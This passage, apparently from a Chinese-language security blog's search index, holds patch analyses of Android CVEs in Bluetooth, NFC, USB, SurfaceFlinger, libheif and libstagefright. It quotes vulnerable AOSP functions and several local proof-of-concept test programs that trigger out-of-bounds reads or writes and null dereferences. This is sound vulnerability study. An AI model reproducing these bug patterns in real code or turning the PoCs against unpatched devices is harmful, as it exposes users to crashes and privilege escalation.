总的来说，Android蓝牙的HFP使得手机能够通过蓝牙连接其他设备，实现无线通话功能。 更多分析后面单独写吧。 ","link":"https://lzxzl.github.io/post/cve-2022-20229-lan-ya-hfp-client-yue-jie-xie/"},{"title":"CVE-2022-20344 - SurfaceFlinger - Race Condition","content":" 2023.09.13 CVE-2022-20344 A-232541124 [2] EoP High 10, 11, 12, 12L patch 分析 根据patch来看，漏洞根因很简单：SurfaceFlinger进程的stealReceiveChannel函数中，全局变量mChannel没有上锁，存在潜在的条件竞争问题，进而可能导致UAF。 漏洞根因很简单，但是这种条件竞争的问题感觉还是很不敏感，需要找时间把pwn.college里的条件竞争抓紧补上。 ","link":"https://lzxzl.github.io/post/cve-2022-20344-surfaceflinger-race-condition/"},{"title":"CVE-2021-39805 - 蓝牙L2CAP - OOB Read","content":" 2023.09.12 CVE-2021-39805 A-212694559 ID High 12, 12L patch 分析 该漏洞发生在L2CAP的Enhanced Credit Based Flow Control Mode（基于信用值的高级流控模式）的实现中。 漏洞根因很明显，STREAM_TO_UINT16(result, p);从 packet 里读取数据给result之前，没有判断这个packet是否还有数据。 看下面第三个图，若攻击者构造的信令packet里的command只有前三个字段，即Length = 0，也就是没有Result字段时，代码中【1】处就会发生OOB Read。 信令packet中command的格式 credit相关的两种command的格式 /******************************************************************************* * * Function l2cble_process_sig_cmd * * Description This function is called when a signalling packet is received * on the BLE signalling CID * * Returns void * ******************************************************************************/ void l2cble_process_sig_cmd(tL2C_LCB* p_lcb, uint8_t* p, uint16_t pkt_len) { ...... STREAM_TO_UINT8(cmd_code, p); STREAM_TO_UINT8(id, p); STREAM_TO_UINT16(cmd_len, p); /* Check command length does not exceed packet length */ if ((p + cmd_len) &gt; p_pkt_end) { L2CAP_TRACE_WARNING( &quot;L2CAP - LE - format error, pkt_len: %d cmd_len: %d code: %d&quot;, pkt_len, cmd_len, cmd_code); return; } switch (cmd_code) { case L2CAP_CMD_CREDIT_BASED_RECONFIG_RES: { uint16_t result; STREAM_TO_UINT16(result, p); // 【1】漏洞点 ...... ","link":"https://lzxzl.github.io/post/cve-2021-39805-lan-ya-l2cap-oob-read/"},{"title":"CVE-2021-39703 - USB服务 - 逻辑漏洞","content":" 2023.09.11 CVE-2021-39703 A-207057578 EoP High 12 patch 分析 这个洞挺有意思的：AOSP里面需要手动授权才能开启USB MTP模式，在断开连接一个已启用MTP的设备之后3秒内再插入其他设备，可能导致其他设备直接获得MTP权限。修复是把这个延时改为1秒。 诶？可是3秒后不还是会发送消息吗？为什么会直接获取MTP权限，还需要再深入分析。 public void updateState(String state) { int connected, configured; if (&quot;DISCONNECTED&quot;.equals(state)) { connected = 0; configured = 0; } else if (&quot;CONNECTED&quot;.equals(state)) { connected = 1; configured = 0; } else if (&quot;CONFIGURED&quot;.equals(state)) { connected = 1; configured = 1; } else { Slog.e(TAG, &quot;unknown state &quot; + state); return; } removeMessages(MSG_UPDATE_STATE); if (connected == 1) removeMessages(MSG_FUNCTION_SWITCH_TIMEOUT); Message msg = Message.obtain(this, MSG_UPDATE_STATE); msg.arg1 = connected; msg.arg2 = configured; // debounce disconnects to avoid problems bringing up USB tethering // 延迟发送消息 // 如果connected等于0（即未连接），则延迟时间为DEVICE_STATE_UPDATE_DELAY；否则，延迟时间为0 sendMessageDelayed(msg, (connected == 0) ? DEVICE_STATE_UPDATE_DELAY : 0); } public void updateHostState(UsbPort port, UsbPortStatus status) { if (DEBUG) { Slog.i(TAG, &quot;updateHostState &quot; + port + &quot; status=&quot; + status); } SomeArgs args = SomeArgs.obtain(); args.arg1 = port; args.arg2 = status; removeMessages(MSG_UPDATE_PORT_STATE); Message msg = obtainMessage(MSG_UPDATE_PORT_STATE, args); // debounce rapid transitions of connect/disconnect on type-c ports sendMessageDelayed(msg, HOST_STATE_UPDATE_DELAY); } USB MTP模式 USB MTP是一种用于在计算机和移动设备之间传输数据的通信协议。它的全称是“USB Media Transfer Protocol”，意思是通过USB接口传输媒体文件的协议。 USB MTP的作用就像是一个桥梁，可以让我们将手机、相机或其他设备中的照片、视频、音乐等文件连接到计算机上，方便地进行文件的传输和管理。它可以让我们在电脑上直接浏览并修改设备中的文件，就像在使用电脑硬盘一样方便。 与传统的USB连接方式相比，USB MTP更加智能和便捷。它不需要我们手动设置设备为“USB存储模式”，而是可以直接通过USB连接线插入计算机的USB接口，然后选择MTP模式，就能够在计算机上访问设备中的文件。 USB MTP的好处还包括可以同时连接多个设备，方便地进行文件的传输和共享。另外，USB MTP还支持自动同步功能，可以在我们连接设备时自动备份和更新文件，确保文件的及时性和安全性。 总之，USB MTP是一种非常方便的传输协议，可以帮助我们在计算机和移动设备之间快速传输文件，方便我们的工作和娱乐。 USB 调试模式 adb使用的是Android设备的USB调试模式，而不是USB MTP模式。 USB调试模式是一种特殊的工作模式，它允许计算机通过USB连接与安卓设备进行通信。在USB调试模式下，ADB可以执行各种操作，如安装应用程序、传输文件、查看设备日志等。 USB MTP模式则是一种用于在计算机和移动设备之间传输媒体文件的协议，如照片、音乐等。虽然USB MTP和USB调试模式都是通过USB连接进行通信，但它们的功能和使用方式是不同的。 ","link":"https://lzxzl.github.io/post/cve-2021-39703-usb-fu-wu-luo-ji-lou-dong/"},{"title":"CVE-2021-39804 - libheif - 空指针解引用","content":" 2023.09.11 补 2023.09.10 CVE-2021-39804 A-215002587 DoS High 11, 12, 12L patch 分析 这个也不难分析，看patch就能看明白。传给atoi的值如果是nullptr，那么就会导致空指针解引用，最后dos。 漏洞发生在reinit函数中。 bool HeifDecoderImpl::reinit(HeifFrameInfo* frameInfo) { ...... mRetriever = new MediaMetadataRetriever(); ...... mSequenceLength = atoi(mRetriever-&gt;extractMetadata(METADATA_KEY_VIDEO_FRAME_COUNT)); } PoC 暂时没看明白PoC和漏洞之间的关系 #include &quot;../includes/common.h&quot; #include &lt;android/imagedecoder.h&gt; #include &lt;binder/IPCThreadState.h&gt; #include &lt;vector&gt; bool testInProgress = false; struct sigaction new_action, old_action; void sigsegv_handler(int signum, siginfo_t *info, void *context) { if (testInProgress &amp;&amp; info-&gt;si_signo == SIGSEGV) { (*old_action.sa_sigaction)(signum, info, context); return; } exit(EXIT_FAILURE); } int main(int argc, char **argv) { // 检查命令行参数个数是否大于等于2 FAIL_CHECK(argc &gt;= 2); sigemptyset(&amp;new_action.sa_mask); new_action.sa_flags = SA_SIGINFO; new_action.sa_sigaction = sigsegv_handler; sigaction(SIGSEGV, &amp;new_action, &amp;old_action); android::ProcessState::self()-&gt;startThreadPool(); // 使用fopen函数打开了命令行参数指定的文件，并使用FAIL_CHECK宏检查文件是否成功打开。如果打开失败，则会终止程序 FILE *file = fopen(argv[1], &quot;r&quot;); FAIL_CHECK(file); // 将文件指针移动到文件末尾，并使用ftell函数获取文件大小。 // 然后，再次使用fseek函数将文件指针移动到文件开头 fseek(file, 0, SEEK_END); size_t size = ftell(file); fseek(file, 0, SEEK_SET); // 定义了一个std::vector&lt;uint8_t&gt;类型的缓冲区buffer，大小为文件大小 std::vector&lt;uint8_t&gt; buffer(size); // 使用fread函数从文件中读取数据到缓冲区中 fread((void *)buffer.data(), 1, size, file); fclose(file); // 解码测试开始 testInProgress = true; // 声明了一个指向AImageDecoder类型的指针变量decoder AImageDecoder *decoder; // 使用AImageDecoder_createFromBuffer函数将缓冲区的数据传递给解码器，并返回解码结果。 //如果解码成功，则调用AImageDecoder_delete函数释放解码器 if (AImageDecoder_createFromBuffer(buffer.data(), size, &amp;decoder) == ANDROID_IMAGE_DECODER_SUCCESS) { AImageDecoder_delete(decoder); } testInProgress = false; FAIL_CHECK(decoder); return EXIT_SUCCESS; } ","link":"https://lzxzl.github.io/post/cve-2021-39804-libheif-kong-zhi-zhen-jie-yin-yong/"},{"title":"CVE-2021-39675 - NFC - OOB Write","content":" 2023.09.11 补 2023.09.09 CVE-2021-39675 A-205729183 EoP 严重 12 patch 分析 很明显，没有判断传入的size的上限，可能导致OOB Write。 /******************************************************************************* ** ** Function GKI_getbuf ** ** Description Called by an application to get a free buffer which ** is of size greater or equal to the requested size. ** ** Note: This routine only takes buffers from public pools. ** It will not use any buffers from pools ** marked GKI_RESTRICTED_POOL. ** ** Parameters size - (input) number of bytes needed. ** ** Returns A pointer to the buffer, or NULL if none available ** *******************************************************************************/ void* GKI_getbuf(uint16_t size) { BUFFER_HDR_T* p_hdr; FREE_QUEUE_T* Q; #if defined(DYN_ALLOC) || defined(FUZZING_BUILD_MODE_UNSAFE_FOR_PRODUCTION) if (size == 0) { // 没有判断size的上限，可能导致越界写 LOG(ERROR) &lt;&lt; StringPrintf(&quot;getbuf: Size is zero&quot;); #ifndef DYN_ALLOC abort(); #else return (nullptr); #endif } size = ALIGN_POOL(size); size_t total_sz = size + sizeof(BUFFER_HDR_T) #if (GKI_ENABLE_BUF_CORRUPTION_CHECK == TRUE) + sizeof(uint32_t); #else ; #endif p_hdr = (BUFFER_HDR_T*)GKI_os_malloc(total_sz); if (!p_hdr) { LOG(ERROR) &lt;&lt; StringPrintf(&quot;unable to allocate buffer!!!!!&quot;); #ifndef DYN_ALLOC abort(); #else return (nullptr); #endif } memset(p_hdr, 0, total_sz); #if (GKI_ENABLE_BUF_CORRUPTION_CHECK == TRUE) *(uint32_t*)((uint8_t*)p_hdr + BUFFER_HDR_SIZE + size) = MAGIC_NO; #endif p_hdr-&gt;task_id = GKI_get_taskid(); p_hdr-&gt;status = BUF_STATUS_UNLINKED; p_hdr-&gt;p_next = nullptr; p_hdr-&gt;Type = 0; p_hdr-&gt;q_id = 0; p_hdr-&gt;size = size; GKI_disable(); Q = &amp;gki_cb.com.freeq[p_hdr-&gt;q_id]; if (++Q-&gt;cur_cnt &gt; Q-&gt;max_cnt) Q-&gt;max_cnt = Q-&gt;cur_cnt; GKI_enable(); DLOG_IF(INFO, nfc_debug_enabled) &lt;&lt; StringPrintf( &quot;%s %p %d:%d&quot;, __func__, ((uint8_t*)p_hdr + BUFFER_HDR_SIZE), Q-&gt;cur_cnt, Q-&gt;max_cnt); UNUSED(gki_alloc_free_queue); return (void*)((uint8_t*)p_hdr + BUFFER_HDR_SIZE); #else uint8_t i; tGKI_COM_CB* p_cb = &amp;gki_cb.com; if (size == 0) { GKI_exception(GKI_ERROR_BUF_SIZE_ZERO, &quot;getbuf: Size is zero&quot;); return (nullptr); } /* Find the first buffer pool that is public that can hold the desired size */ for (i = 0; i &lt; p_cb-&gt;curr_total_no_of_pools; i++) { if (size &lt;= p_cb-&gt;freeq[p_cb-&gt;pool_list[i]].size) break; } if (i == p_cb-&gt;curr_total_no_of_pools) { GKI_exception(GKI_ERROR_BUF_SIZE_TOOBIG, &quot;getbuf: Size is too big&quot;); return (nullptr); } /* Make sure the buffers aren't disturbed til finished with allocation */ GKI_disable(); /* search the public buffer pools that are big enough to hold the size * until a free buffer is found */ for (; i &lt; p_cb-&gt;curr_total_no_of_pools; i++) { /* Only look at PUBLIC buffer pools (bypass RESTRICTED pools) */ if (((uint16_t)1 &lt;&lt; p_cb-&gt;pool_list[i]) &amp; p_cb-&gt;pool_access_mask) continue; Q = &amp;p_cb-&gt;freeq[p_cb-&gt;pool_list[i]]; if (Q-&gt;cur_cnt &lt; Q-&gt;total) { if (Q-&gt;p_first == nullptr &amp;&amp; gki_alloc_free_queue(i) != true) { LOG(ERROR) &lt;&lt; StringPrintf(&quot;out of buffer&quot;); GKI_enable(); return nullptr; } if (Q-&gt;p_first == nullptr) { /* gki_alloc_free_queue() failed to alloc memory */ LOG(ERROR) &lt;&lt; StringPrintf(&quot;fail alloc free queue&quot;); GKI_enable(); return nullptr; } p_hdr = Q-&gt;p_first; Q-&gt;p_first = p_hdr-&gt;p_next; if (!Q-&gt;p_first) Q-&gt;p_last = nullptr; if (++Q-&gt;cur_cnt &gt; Q-&gt;max_cnt) Q-&gt;max_cnt = Q-&gt;cur_cnt; GKI_enable(); p_hdr-&gt;task_id = GKI_get_taskid(); p_hdr-&gt;status = BUF_STATUS_UNLINKED; p_hdr-&gt;p_next = nullptr; p_hdr-&gt;Type = 0; return ((void*)((uint8_t*)p_hdr + BUFFER_HDR_SIZE)); } } LOG(ERROR) &lt;&lt; StringPrintf(&quot;unable to allocate buffer!!!!!&quot;); GKI_enable(); return (nullptr); #endif } PoC #include &quot;../includes/common.h&quot; #include &quot;gki.h&quot; int main() { return (GKI_getbuf(USHRT_MAX) == nullptr) ? EXIT_SUCCESS : EXIT_VULNERABLE; } ","link":"https://lzxzl.github.io/post/cve-2021-39675-nfc-oob-write/"},{"title":"CVE-2021-39665 - libstagefright - OOB Read","content":" 2023.09.11 补 2023.09.08 哎，8号卡在一个蓝牙cve，分析不出来就顿住了。不能这样了，以后遇到分析不出来的就先挂着吧。 CVE-2021-39665 A-204077881 ID 高 12 patch 分析 很明显，没有检查传入的参数buffer的长度。如果传入的buffer的长度为0，那么data[0]那里就会发生越界读。 相邻的另一个函数checkIFrameProvided就检查了入参buffer的长度。 void AAVCAssembler::checkSpsUpdated(const sp&lt;ABuffer&gt; &amp;buffer) { const uint8_t *data = buffer-&gt;data(); unsigned nalType = data[0] &amp; 0x1f; // 如果buffer的长度为0，则data[0]这里会发生越界读 if (nalType == 0x7) { int32_t width = 0, height = 0; FindAVCDimensions(buffer, &amp;width, &amp;height); if (width != mWidth || height != mHeight) { mFirstIFrameProvided = false; mWidth = width; mHeight = height; ALOGD(&quot;found a new resolution (%u x %u)&quot;, mWidth, mHeight); } } } void AAVCAssembler::checkIFrameProvided(const sp&lt;ABuffer&gt; &amp;buffer) { if (buffer-&gt;size() == 0) { return; } const uint8_t *data = buffer-&gt;data(); unsigned nalType = data[0] &amp; 0x1f; if (nalType == 0x5) { mLastIFrameProvidedAtMs = ALooper::GetNowUs() / 1000; if (!mFirstIFrameProvided) { mFirstIFrameProvided = true; uint32_t rtpTime; CHECK(buffer-&gt;meta()-&gt;findInt32(&quot;rtp-time&quot;, (int32_t *)&amp;rtpTime)); ALOGD(&quot;got First I-frame to be decoded. rtpTime=%d, size=%zu&quot;, rtpTime, buffer-&gt;size()); } } } 诶，还发现旁边dropFramesUntilIframe函数也有同样的问题，但可惜，最新代码里已经改了： bool AAVCAssembler::dropFramesUntilIframe(const sp&lt;ABuffer&gt; &amp;buffer) { const uint8_t *data = buffer-&gt;data(); unsigned nalType = data[0] &amp; 0x1f; if (!mFirstIFrameProvided &amp;&amp; nalType &lt; 0x5) { return true; } return false; } PoC #include &lt;dlfcn.h&gt; #include &quot;../includes/common.h&quot; #define private public #include &lt;media/stagefright/rtsp/AAVCAssembler.h&gt; using namespace android; bool isOverloadingEnabled = false; bool isTestInProgress = false; struct sigaction newAction, oldAction; static void *(*realMalloc)(size_t) = nullptr; // 重定义malloc函数 void *malloc(size_t size) { // 如果realMalloc为nullptr，则通过dlsym函数获取malloc函数的地址，并赋值给realMalloc // 也就是还是调用原来的malloc if (!realMalloc) { realMalloc = (void *(*)(size_t))dlsym(RTLD_NEXT, &quot;malloc&quot;); if (!realMalloc) { return nullptr; } } // 如果isOverloadingEnabled为true并且申请分配的空间size为0， // 则通过memalign函数分配内存，并使用mprotect函数将内存的访问权限设置为PROT_NONE // PROT_NONE表示将内存区域的访问权限设置为无权限，即不能读取、写入或执行该内存区域。 if (isOverloadingEnabled &amp;&amp; (size == 0)) { size_t pageSize = sysconf(_SC_PAGE_SIZE); // pageSize = 4k? void *ptr = memalign(pageSize, pageSize); // 分配一个4k大小的内存块（对齐4k） mprotect(ptr, pageSize, PROT_NONE); // 将通过memalign函数分配的内存区域的访问权限设置为无权限，以保护该内存区域不被访问或修改。 return ptr; } // 最后返回realMalloc(size) return realMalloc(size); } void sigsegv_handler(int signum, siginfo_t *info, void *context) { // 如果isTestInProgress为true并且info-&gt;si_signo等于 SIGSEGV， // 则调用oldAction.sa_sigaction函数，并返回。否则，调用_exit(EXIT_FAILURE)。 if (isTestInProgress &amp;&amp; info-&gt;si_signo == SIGSEGV) { (*oldAction.sa_sigaction)(signum, info, context); return; } _exit(EXIT_FAILURE); } int main() { // 清空newAction.sa_mask sigemptyset(&amp;newAction.sa_mask); newAction.sa_flags = SA_SIGINFO; newAction.sa_sigaction = sigsegv_handler; // 注册SIGSEGV信号的处理函数为 sigsegv_handler // 并将旧的信号处理函数保存在oldAction中 sigaction(SIGSEGV, &amp;newAction, &amp;oldAction); sp&lt;ABuffer&gt; buffer(new ABuffer(16)); FAIL_CHECK(buffer != nullptr); sp&lt;AMessage&gt; meta = buffer-&gt;meta(); FAIL_CHECK(meta != nullptr); uint32_t rtpTime = 16; meta-&gt;setInt32(&quot;rtp-time&quot;, rtpTime); AAVCAssembler *assembler = new AAVCAssembler(meta); FAIL_CHECK(assembler != nullptr); isOverloadingEnabled = true; // 设置这个变量之后，下面申请size为0的堆块时，就会分配一页大小的空间，但是是不可访问的 sp&lt;ABuffer&gt; zeroSizedBuffer(new ABuffer(0)); isOverloadingEnabled = false; isTestInProgress = true; // 设置isTestInProgress为false，那么当访问不可访问的地址时，发生SIGSEGV，进而进入sigsegv_handler函数里的if条件，然后？ assembler-&gt;checkSpsUpdated(zeroSizedBuffer); isTestInProgress = false; return EXIT_SUCCESS; } 后面再补上触发效果吧。 ","link":"https://lzxzl.github.io/post/cve-2021-39665-libstagefright-oob-readmd/"},{"title":"CVE-2021-39629 - NFC - UAF","content":" 2023.09.07 CVE-2021-39629 A-197353344 EoP 高 9、10、11、12 patch 分析 漏洞点位于phTmlNfc_Init函数，该函数会malloc一个chunk给上下文变量gpphTmlNfc_Context，然后初始化其中的一些成员变量。当TML层初始化失败时，只调用**phTmlNfc_CleanUp**函数来清除初始化过程中打开的handles，而已经初始化的一些接口并没有被清除掉，导致UAF。 patch是把phTmlNfc_CleanUp换成phTmlNfc_Shutdown_CleanUp。看下面的代码，区别是后者会先调用phTmlNfc_Shutdown()，然后再调用phTmlNfc_CleanUp。所以前者就是缺少了shutdown的过程。 那么shutdown和cleanup有什么区别呢？按照对这两个函数的描述来看，phTmlNfc_Shutdown()用于清除已经初始化的一些接口（猜测主要是在关闭gpphTmlNfc_Context-&gt;readerThread和 gpphTmlNfc_Context-&gt;writerThread这两个线程的时候？），而且该函数里还会销毁互斥锁。而phTmlNfc_CleanUp()函数主要用于清除初始化过程中打开的handles。 此外，shutdown会对gpphTmlNfc_Context的成员变量进行sem_post操作，而cleanup会对gpphTmlNfc_Context的成员变量进行sem_destroy操作。 sem_post和sem_destroy两者的区别？ sem_post和sem_destroy都是POSIX信号量操作函数。 sem_post函数用于释放信号量，即增加指定信号量的计数值，使其变为可用状态。这通常用于释放由信号量控制的某个资源，使其他等待该资源的线程可以继续执行。如果没有线程在等待，则信号量的值仅增加1。 sem_destroy函数用于销毁指定的信号量。它会彻底释放信号量所占用的资源，并将信号量的状态设置为未初始化的状态。当一个信号量被销毁后，它不能再被使用。在调用sem_destroy之后，如果再次对信号量进行操作，将会产生未定义的行为。通常在不再需要使用信号量时，会调用sem_destroy函数来释放相关的资源。 综上所述，sem_post用于释放信号量，即增加信号量的计数值，使其变为可用状态。而sem_destroy用于销毁信号量，即彻底释放信号量的资源，并将其恢复到未初始化的状态。 phTmlNfc_Init /******************************************************************************* ** ** Function phTmlNfc_Init ** ** Description Provides initialization of TML layer and hardware interface ** Configures given hardware interface and sends handle to the ** caller ** 该函数是TML（Transport Layer Manager）层的初始化函数。 ** TML层用于提供与硬件接口的交互，包括配置硬件接口和发送句柄给调用者。 ** ** Parameters pConfig - TML configuration details as provided by the upper ** layer 参数pConfig是TML配置的详细信息，由上层提供。 ** ** Returns NFC status: ** NFCSTATUS_SUCCESS - initialization successful ** NFCSTATUS_INVALID_PARAMETER - at least one parameter is ** invalid ** NFCSTATUS_FAILED - initialization failed (for example, ** unable to open hardware interface) ** NFCSTATUS_INVALID_DEVICE - device has not been opened or has ** been disconnected ** 返回NFC状态，包括成功初始化、无效参数、初始化失败和设备未打开或已断开连接等 ** *******************************************************************************/ NFCSTATUS phTmlNfc_Init(pphTmlNfc_Config_t pConfig) { NFCSTATUS wInitStatus = NFCSTATUS_SUCCESS; /* Check if TML layer is already Initialized */ // 检查TML层是否已经初始化，如果已经初始化则返回错误码NFCSTATUS_ALREADY_INITIALISED if (NULL != gpphTmlNfc_Context) { /* TML initialization is already completed */ wInitStatus = PHNFCSTVAL(CID_NFC_TML, NFCSTATUS_ALREADY_INITIALISED); } /* Validate Input parameters */ // 验证输入参数，如果参数为空或者dwGetMsgThreadId参数为默认值（PH_TMLNFC_RESET_VALUE）， // 则返回错误码NFCSTATUS_INVALID_PARAMETER。 else if ((NULL == pConfig) || (PH_TMLNFC_RESET_VALUE == pConfig-&gt;dwGetMsgThreadId)) { /*Parameters passed to TML init are wrong */ wInitStatus = PHNFCSTVAL(CID_NFC_TML, NFCSTATUS_INVALID_PARAMETER); } else { /* Allocate memory for TML context */ // 为TML上下文分配内存 gpphTmlNfc_Context = (phTmlNfc_Context_t*)malloc(sizeof(phTmlNfc_Context_t)); // 如果内存分配失败，则返回错误码NFCSTATUS_FAILED if (NULL == gpphTmlNfc_Context) { wInitStatus = PHNFCSTVAL(CID_NFC_TML, NFCSTATUS_FAILED); } else { /* Initialise all the internal TML variables */ // 初始化TML的所有内部变量，将上下文内存区域清零，并设置线程标志位为1，表示线程已完成。 memset(gpphTmlNfc_Context, PH_TMLNFC_RESET_VALUE, sizeof(phTmlNfc_Context_t)); /* Make sure that the thread runs once it is created */ gpphTmlNfc_Context-&gt;bThreadDone = 1; /* Open the device file to which data is read/written */ // 打开设备文件并进行配置，返回状态码给wInitStatus。 wInitStatus = phTmlNfc_i2c_open_and_configure( pConfig, &amp;(gpphTmlNfc_Context-&gt;pDevHandle)); // 如果打开设备失败，则返回错误码NFCSTATUS_INVALID_DEVICE。 if (NFCSTATUS_SUCCESS != wInitStatus) { wInitStatus = PHNFCSTVAL(CID_NFC_TML, NFCSTATUS_INVALID_DEVICE); gpphTmlNfc_Context-&gt;pDevHandle = NULL; // 如果打开成功，则初始化读写信息的其他变量，包括是否启用读写线程和线程忙标志位等。 } else { gpphTmlNfc_Context-&gt;tReadInfo.bEnable = 0; gpphTmlNfc_Context-&gt;tWriteInfo.bEnable = 0; gpphTmlNfc_Context-&gt;tReadInfo.bThreadBusy = false; gpphTmlNfc_Context-&gt;tWriteInfo.bThreadBusy = false; // 初始化互斥锁和信号量。如果初始化失败，则返回错误码NFCSTATUS_FAILED。 if (pthread_mutex_init(&amp;gpphTmlNfc_Context-&gt;readInfoUpdateMutex, NULL) != 0) { wInitStatus = NFCSTATUS_FAILED; } else if (0 != sem_init(&amp;gpphTmlNfc_Context-&gt;rxSemaphore, 0, 0)) { wInitStatus = NFCSTATUS_FAILED; } else if (0 != sem_init(&amp;gpphTmlNfc_Context-&gt;txSemaphore, 0, 0)) { wInitStatus = NFCSTATUS_FAILED; } else if (0 != sem_init(&amp;gpphTmlNfc_Context-&gt;postMsgSemaphore, 0, 0)) { wInitStatus = NFCSTATUS_FAILED; } else { // 发送信号量postMsgSemaphore，表示TML线程已开始运行。 sem_post(&amp;gpphTmlNfc_Context-&gt;postMsgSemaphore); /* Start TML thread (to handle write and read operations) */ // 启动TML线程来处理写和读操作。如果线程启动失败，则返回错误码NFCSTATUS_FAILED if (NFCSTATUS_SUCCESS != phTmlNfc_StartThread()) { wInitStatus = PHNFCSTVAL(CID_NFC_TML, NFCSTATUS_FAILED); } else { /* Create Timer used for Retransmission of NCI packets */ // 创建用于重传NCI数据包的定时器。 gpphTmlNfc_Context-&gt;dwTimerId = phOsalNfc_Timer_Create(); // 如果定时器创建成功，则存储线程标识符dwCallbackThreadId和配置信息eConfig。 if (PH_OSALNFC_TIMER_ID_INVALID != gpphTmlNfc_Context-&gt;dwTimerId) { /* Store the Thread Identifier to which Message is to be posted */ gpphTmlNfc_Context-&gt;dwCallbackThreadId = pConfig-&gt;dwGetMsgThreadId; /* Enable retransmission of Nci packet &amp; set retry count to * default */ gpphTmlNfc_Context-&gt;eConfig = phTmlNfc_e_DisableRetrans; /* Retry Count = Standby Recovery time of NFCC / Retransmission * time + 1 */ // 设置重试计数bRetryCount，计算公式为（2000 / PHTMLNFC_MAXTIME_RETRANSMIT）+ 1 gpphTmlNfc_Context-&gt;bRetryCount = (2000 / PHTMLNFC_MAXTIME_RETRANSMIT) + 1; gpphTmlNfc_Context-&gt;bWriteCbInvoked = false; } else { wInitStatus = PHNFCSTVAL(CID_NFC_TML, NFCSTATUS_FAILED); } } } } } } /* Clean up all the TML resources if any error */ // 如果初始化过程中发生错误，则清理TML的所有资源。 if (NFCSTATUS_SUCCESS != wInitStatus) { /* Clear all handles and memory locations initialized during init */ phTmlNfc_CleanUp(); // 【漏洞点】 } return wInitStatus; // 返回初始化状态码wInitStatus。 } phTmlNfc_CleanUp - Free /******************************************************************************* ** ** Function phTmlNfc_CleanUp ** ** Description Clears all handles opened during TML initialization ** 清除所有TML层初始化时打开的handles ** ** Parameters None ** ** Returns None ** *******************************************************************************/ void phTmlNfc_CleanUp(void) { // 检查gpphTmlNfc_Context是否为NULL。 // 如果为NULL，表示TML上下文尚未初始化，直接返回 if (NULL == gpphTmlNfc_Context) { return; } // 检查gpphTmlNfc_Context-&gt;pDevHandle是否为NULL。 // 如果不为NULL，表示有设备handle存在。 if (NULL != gpphTmlNfc_Context-&gt;pDevHandle) { // 调用phTmlNfc_i2c_reset函数重置I2C通信，并忽略其返回值 (void)phTmlNfc_i2c_reset(gpphTmlNfc_Context-&gt;pDevHandle, 0); // 将gpphTmlNfc_Context-&gt;bThreadDone的值设为0，用于终止线程 gpphTmlNfc_Context-&gt;bThreadDone = 0; } // 销毁下面三个信号量 sem_destroy(&amp;gpphTmlNfc_Context-&gt;rxSemaphore); sem_destroy(&amp;gpphTmlNfc_Context-&gt;txSemaphore); sem_destroy(&amp;gpphTmlNfc_Context-&gt;postMsgSemaphore); // 调用phTmlNfc_i2c_close函数关闭I2C通信 phTmlNfc_i2c_close(gpphTmlNfc_Context-&gt;pDevHandle); // 将gpphTmlNfc_Context-&gt;pDevHandle的值设为NULL gpphTmlNfc_Context-&gt;pDevHandle = NULL; /* Clear memory allocated for storing Context variables */ // 释放存储上下文变量的内存空间 free((void*)gpphTmlNfc_Context); /* Set the pointer to NULL to indicate De-Initialization */ // 将gpphTmlNfc_Context的值设NULL，表示已经完成了销毁 gpphTmlNfc_Context = NULL; return; } phTmlNfc_Shutdown_CleanUp - Free /******************************************************************************* ** ** Function phTmlNfc_Shutdown_CleanUp ** ** Description wrapper function for shutdown and cleanup of resources ** ** Parameters None ** ** Returns NFCSTATUS ** *******************************************************************************/ NFCSTATUS phTmlNfc_Shutdown_CleanUp() { NFCSTATUS wShutdownStatus = phTmlNfc_Shutdown(); phTmlNfc_CleanUp(); return wShutdownStatus; } phTmlNfc_Shutdown /******************************************************************************* ** ** Function phTmlNfc_Shutdown ** ** Description Uninitializes TML layer and hardware interface ** 清除TML层和hardware的接口 ** ** Parameters None ** ** Returns NFC status: ** NFCSTATUS_SUCCESS - TML configuration released successfully ** NFCSTATUS_INVALID_PARAMETER - at least one parameter is ** invalid ** NFCSTATUS_FAILED - un-initialization failed (example: unable ** to close interface) ** *******************************************************************************/ NFCSTATUS phTmlNfc_Shutdown(void) { NFCSTATUS wShutdownStatus = NFCSTATUS_SUCCESS; /* Check whether TML is Initialized */ // 检查gpphTmlNfc_Context是否为NULL。 // gpphTmlNfc_Context是一个指向TML上下文的指针，用于判断TML是否已初始化 if (NULL != gpphTmlNfc_Context) { /* Reset thread variable to terminate the thread */ // 将gpphTmlNfc_Context-&gt;bThreadDone的值设为0，用于终止线程 gpphTmlNfc_Context-&gt;bThreadDone = 0; usleep(1000); // 暂停1毫秒 /* Clear All the resources allocated during initialization */ // 清除所有初始化时分配的资源 // 调用sem_post函数，释放gpphTmlNfc_Context-&gt;rxSemaphore信号量 sem_post(&amp;gpphTmlNfc_Context-&gt;rxSemaphore); usleep(1000); // 调用sem_post函数，释放gpphTmlNfc_Context-&gt;txSemaphore信号量 sem_post(&amp;gpphTmlNfc_Context-&gt;txSemaphore); usleep(1000); // 调用sem_post函数，释放gpphTmlNfc_Context-&gt;postMsgSemaphore信号量 sem_post(&amp;gpphTmlNfc_Context-&gt;postMsgSemaphore); usleep(1000); // 这里为啥重复调用？ sem_post(&amp;gpphTmlNfc_Context-&gt;postMsgSemaphore); usleep(1000); // 销毁gpphTmlNfc_Context-&gt;readInfoUpdateMutex互斥锁 pthread_mutex_destroy(&amp;gpphTmlNfc_Context-&gt;readInfoUpdateMutex); // pthread_join函数用于等待指定的线程终止，并获取其返回值 // 下面这两个if是用来确保readerThread线程和writerThread线程已经成功终止 // 检查gpphTmlNfc_Context-&gt;readerThread线程的终止状态， // 如果pthread_join函数返回值不为0（即线程终止失败） // 则打印错误日志 if (0 != pthread_join(gpphTmlNfc_Context-&gt;readerThread, (void**)NULL)) { NXPLOG_TML_E(&quot;Fail to kill reader thread!&quot;); } // 检查gpphTmlNfc_Context-&gt;writerThread线程的终止状态 if (0 != pthread_join(gpphTmlNfc_Context-&gt;writerThread, (void**)NULL)) { NXPLOG_TML_E(&quot;Fail to kill writer thread!&quot;); } NXPLOG_TML_D(&quot;bThreadDone == 0&quot;); } else { // 如果ghTmlNfc_Context为NULL，则将wStatus的值设为PHNFCSTVAL(CID_NFC_TML, NFCSTATUS_NOT_INITIALISED)。 // PHNFCSTVAL是一个用于创建NFC错误的宏 wShutdownStatus = PHNFCSTVAL(CID_NFC_TML, NFCSTATUS_NOT_INITIALISED); } // 返回wShutdownStatus作为函数的结果 return wShutdownStatus; } phTmlNfc_TmlThread - Use /******************************************************************************* ** ** Function phTmlNfc_TmlThread ** ** Description Read the data from the lower layer driver ** ** Parameters pParam - parameters for 